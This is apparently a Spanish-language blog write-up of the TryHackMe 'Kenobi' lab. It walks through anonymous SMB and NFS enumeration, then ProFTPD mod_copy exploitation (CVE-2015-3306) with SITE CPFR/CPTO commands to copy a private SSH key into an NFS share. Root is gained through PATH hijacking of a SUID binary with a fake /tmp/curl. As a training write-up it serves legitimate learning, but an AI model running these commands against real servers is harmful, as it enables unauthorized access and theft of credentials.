---
title: Kenobi — TryHackMe Write-up
date: 2026-04-01 19:00:00 +0200
categories:
  - Write-ups
  - TryHackMe
tags:
  - linux
  - smb
  - nfs
  - proftpd
  - suid
  - privesc
  - path-hijacking
  - beginner
description: Encadenamiento de SMB anónimo, NFS sin autenticar y ProFTPD mod_copy (CVE-2015-3306) para obtener acceso SSH como kenobi. Escalada a root vía Path Hijacking sobre un binario SUID que llama a curl sin ruta absoluta.
pin: false
math: false
mermaid: false
share: true
---

Kenobi está catalogada como "easy" en TryHackMe pero técnicamente es de las salas que más aprovechas si vas con calma, porque **el truco no está en una técnica aislada sino en cómo encadenas cuatro**: SMB anónimo te da la pista, NFS te da un canal de salida, ProFTPD te da el "copy" que necesitas, y un SUID mal escrito te lleva a root. Ningún paso por separado es suficiente.

Aquí ves en miniatura cómo se construyen los ataques reales: nadie tiene un exploit mágico que te da root de una. Lo que tienen es la paciencia de encontrar tres bugs medianos y darse cuenta de que combinándolos pasas de "no tengo nada" a "soy root". Es exactamente la mentalidad que separa a alguien que sabe correr exploits de alguien que sabe pentesting.

> **TL;DR**: SMB anonymous expone un `log.txt` que revela una clave SSH privada en `/home/kenobi/.ssh/id_rsa` → ProFTPD 1.3.5 con `mod_copy` permite copiar esa clave sin auth a `/var/nfs` → montamos NFS y nos llevamos la clave → SSH como `kenobi` → binario SUID `/usr/bin/menu` llama a `curl` sin ruta absoluta → Path Hijacking con `/bin/sh` falso en `/tmp` → root.
{: .prompt-info }

## Información de la máquina

| Campo       | Valor                        |
| ----------- | ---------------------------- |
| Plataforma  | TryHackMe                    |
| Dificultad  | Easy                         |
| OS          | Linux (Ubuntu)               |
| IP          | 10.128.150.121               |
| Fecha       | 2026-04-01                   |

## Técnicas utilizadas

- Enumeración de puertos con `nmap`
- Enumeración de shares SMB con `smbclient` y `smbget`
- Enumeración de NFS con `showmount`
- Explotación de ProFTPD 1.3.5 `mod_copy` (CVE-2015-3306)
- Montaje de NFS para exfiltrar clave SSH privada
- Escalada de privilegios por Path Hijacking sobre binario SUID

## Notas previas — entorno Arch Linux

Esta sala la hice desde Arch en lugar de Kali, y hay tres cosas que me hicieron perder tiempo. Si vas también con Arch (o con cualquier distro distinta a Kali), te ahorras el dolor:

> **`smbclient get` no funciona en Arch.** Falla por diferencias en cómo Arch empaqueta Samba. La solución es usar `smbget` en su lugar:  
> ```bash
> smbget smb://IP/share/archivo -a   # -a = anonymous
> ```
{: .prompt-warning }

> **Permisos al copiar `id_rsa` con sudo.** Si copias el archivo siendo root, SSH luego rechaza la clave porque el propietario no coincide con el usuario. Arreglar siempre con:  
> ```bash
> sudo chown saskull:saskull id_rsa
> chmod 600 id_rsa
> ```
{: .prompt-warning }

> **`/bin/bash` baja privilegios desde un SUID.** Bash detecta cuando es invocado desde un binario con setuid y elimina los privilegios elevados como medida de seguridad. Si quieres mantener root tras explotar un SUID, usa `/bin/sh`:  
> ```bash
> echo /bin/sh > /tmp/curl   # no /bin/bash
> ```
{: .prompt-danger }

## Enumeración

### Nmap completo

```bash
nmap -sC -sV -p- 10.128.150.121 -T4 -oA nmap_kenobi
```

Puertos encontrados:

| Puerto    | Servicio | Versión          |
| --------- | -------- | ---------------- |
| 21/tcp    | FTP      | ProFTPD 1.3.5    |
| 22/tcp    | SSH      | OpenSSH 7.2p2    |
| 80/tcp    | HTTP     | Apache 2.4.18    |
| 111/tcp   | RPC      | rpcbind          |
| 139/tcp   | SMB      | Samba            |
| 445/tcp   | SMB      | Samba            |
| 2049/tcp  | NFS      | nfs              |

Tres cosas saltan a la vista nada más ver el output:

1. **ProFTPD 1.3.5** — versión exacta, públicamente vulnerable a `mod_copy` (CVE-2015-3306)
2. **NFS expuesto** — puerto 111 + 2049 abiertos. Hay que enumerar shares con `showmount`
3. **SMB en puerto 139/445** — primer paso obvio, probar anonymous

> Cuando veas puerto **111 (rpcbind)** o **2049 (nfs)** abiertos en una máquina, lanza `showmount -e <IP>` siempre. NFS mal configurado es uno de los hallazgos más recurrentes en pentests reales en empresas con infra Linux antigua.
{: .prompt-tip }

### Enumeración SMB

```bash
# Listar shares disponibles
smbclient -L //10.128.150.121 -N --configfile=/etc/samba/smb.conf
```

Share encontrado: `anonymous` (accesible sin contraseña).

```bash
# Descargar archivo del share (en Arch, usar smbget)
smbget smb://10.128.150.121/anonymous/log.txt -a
```

Contenido de `log.txt` — información crítica encontrada:

```
Generating public/private rsa key pair.
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
```

El log revela dos datos clave:

- Existe un usuario llamado **`kenobi`**
- Tiene una clave SSH privada en `/home/kenobi/.ssh/id_rsa`

Si conseguimos esa clave, entramos por SSH como kenobi sin necesidad de contraseña.

### Enumeración NFS

```bash
showmount -e 10.128.150.121
```

Output:

```
/var/nfs *
```

El asterisco significa que `/var/nfs` está accesible **desde cualquier IP**, sin restricciones. Esto va a ser nuestra "carpeta de salida" para sacar la clave SSH del sistema.

## Explotación — ProFTPD 1.3.5 mod_copy

### Por qué funciona

ProFTPD 1.3.5 tiene el módulo `mod_copy` habilitado por defecto. Este módulo permite copiar archivos internos del sistema **sin autenticación** usando los comandos `SITE CPFR` (copy from) y `SITE CPTO` (copy to).

El bug está en que `mod_copy` no valida los permisos del usuario conectado. Cualquiera puede copiar cualquier archivo legible por el proceso FTP (que normalmente corre como `nobody` o `proftpd`, pero a veces tiene permisos amplios) a cualquier ruta escribible del sistema.

### Explotación práctica

```bash
# Conectar al FTP por netcat (sin login)
nc 10.128.150.121 21

# Copiar la clave SSH privada de kenobi a /var/nfs (accesible por NFS)
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/nfs/id_rsa
```

Con esos dos comandos, la clave privada de kenobi acaba de aparecer en `/var/nfs/id_rsa`, que es donde NFS expone archivos a cualquiera.

## Acceso inicial — SSH como kenobi

### Montar NFS y recuperar la clave

```bash
# Crear punto de montaje
sudo mkdir /mnt/kenobiNFS

# Montar el share NFS
sudo mount -t nfs 10.128.150.121:/var/nfs /mnt/kenobiNFS

# Copiar la clave a nuestra carpeta de trabajo
cp /mnt/kenobiNFS/id_rsa ~/Escritorio/THM/Kenobi/

# Arreglar propietario y permisos (crítico)
sudo chown saskull:saskull id_rsa
chmod 600 id_rsa

# Desmontar
sudo umount /mnt/kenobiNFS
```

### Conectar por SSH

```bash
ssh -i id_rsa kenobi@10.128.150.121
```

Acceso conseguido como usuario `kenobi`.

```bash
kenobi@kenobi:~$ cat user.txt
```

## Escalada de privilegios — Path Hijacking sobre SUID

### Buscar binarios SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

Binario sospechoso encontrado: **`/usr/bin/menu`**.

Los otros SUID son estándar del sistema (`sudo`, `passwd`, `mount`, `su`...). `menu` no es un binario habitual de Linux: es personalizado y tiene SUID. Es exactamente el tipo de cosa que hay que investigar.

### Analizar el binario

```bash
strings /usr/bin/menu
```

Output relevante:

```
1. status check
2. kernel version
3. ifconfig
curl -I localhost
uname -r
ifconfig
```

El binario llama a `curl`, `uname` e `ifconfig` **sin ruta completa**. Esto significa que confía en el `$PATH` del usuario para encontrarlos. Como `menu` corre como root (SUID), si sustituimos `curl` por algo malicioso en una ruta que se busque antes que `/usr/bin/`, ese algo malicioso se ejecutará como root.

> Este es el patrón clásico de **Path Hijacking**: un binario con SUID llama a otro binario sin especificar la ruta absoluta. La defensa es siempre usar paths absolutos (`/usr/bin/curl` en vez de `curl`). El error es común en scripts y herramientas mal escritas.
{: .prompt-info }

### Ejecutar el Path Hijacking

```bash
# Crear un "curl" falso en /tmp que simplemente arranca una shell
echo /bin/sh > /tmp/curl
chmod 777 /tmp/curl

# Poner /tmp primero en el PATH para que se busque antes que /usr/bin
export PATH=/tmp:$PATH

# Ejecutar el binario SUID
/usr/bin/menu
# Seleccionar opción 1 (la que llama a curl internamente)
```

```bash
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi)

# cat /root/root.txt
```

> **Por qué `/bin/sh` y no `/bin/bash`**: bash incluye una protección que detecta cuando se ejecuta desde un binario con setuid y elimina los privilegios elevados automáticamente. `sh` (dash en Ubuntu) no tiene esta protección y mantiene el UID efectivo del binario que lo llamó. Es un detalle pequeño pero crítico que arruina muchos intentos de Path Hijacking si no lo sabes.
{: .prompt-danger }

## Flags

| Flag       | Ubicación                  |
| ---------- | -------------------------- |
| user.txt   | `/home/kenobi/user.txt`    |
| root.txt   | `/root/root.txt`           |

## Resumen del flujo — cómo encajan las piezas

```
SMB anonymous share
    └─> log.txt revela que kenobi tiene id_rsa en /home/kenobi/.ssh/

NFS expone /var/nfs accesible sin autenticación
    └─> podemos montar esa carpeta y descargar lo que haya ahí

ProFTPD mod_copy permite copiar archivos sin autenticación
    └─> copiamos /home/kenobi/.ssh/id_rsa a /var/nfs/id_rsa

Montar NFS → descargar id_rsa
    └─> SSH como kenobi sin contraseña

Binario SUID /usr/bin/menu llama a curl sin ruta absoluta
    └─> curl falso en /tmp + PATH manipulado
    └─> menu → curl falso → /bin/sh con UID 0 → root
```

Ninguna técnica sola era suficiente. Las tres primeras se encadenan para conseguir el acceso inicial. La cuarta escala a root. Esto es lo que diferencia un ejercicio de "lanzar exploits" de un ataque de verdad: la pieza que falta para conectar A con D nunca está donde la buscas, está en B y C.

## Lecciones aprendidas

- Cuando ves puerto **111 o 2049** → siempre `showmount -e <IP>` para enumerar NFS
- SMB anonymous puede contener información que revela **rutas y nombres de usuarios** del sistema, no solo archivos jugosos en sí
- **ProFTPD 1.3.5** → comprobar `mod_copy` con `nc <IP> 21` y probar `SITE CPFR` / `SITE CPTO`. Si ProFTPD acepta esos comandos sin login, está habilitado y vulnerable
- Las claves SSH privadas necesitan permisos exactos `600` y propietario correcto. Si SSH rechaza tu clave con `Bad permissions`, casi siempre es por esto
- `strings` sobre un binario SUID es la primera herramienta para encontrar privesc: revela los programas y rutas que el binario invoca internamente
- Si un SUID llama programas sin ruta absoluta → **vulnerable a Path Hijacking**
- Usar `/bin/sh` en vez de `/bin/bash` para mantener privilegios desde un SUID
- En Arch, `smbget` en vez de `smbclient get` para descargar archivos por SMB

## Reflexión

Lo que más me ha enseñado esta sala es que **encontrar el "qué" es la parte fácil**. ProFTPD vulnerable con `searchsploit` lo encuentras en 30 segundos. NFS expuesto en `showmount` te lo dice una herramienta gratis. El binario SUID lo lista `find`. Lo difícil — y lo que me llevó tiempo en mi primera intentona — es **darme cuenta de que esos tres hallazgos sueltos forman una cadena**. 

Cuando vienes de IT corporativo como yo (Power Platform, M365, automatización) tienes el reflejo de pensar problema → solución directa. Pentesting es lo contrario: tienes que pensar en términos de *encadenamiento*, donde la "solución" intermedia (acceder a `/var/nfs`) no es el objetivo final pero sin ella no llegas al objetivo. Esta mentalidad de "qué me da esto que pueda combinar con aquello" es lo que estoy practicando con cada caja.

## Referencias

- [HackTricks — Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [HackTricks — Pentesting NFS](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
- [HackTricks — PATH Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path)
- [Exploit-DB 36742 — ProFTPD 1.3.5 mod_copy](https://www.exploit-db.com/exploits/36742)
- [GTFOBins](https://gtfobins.github.io)
- [TryHackMe — Kenobi](https://tryhackme.com/room/kenobi)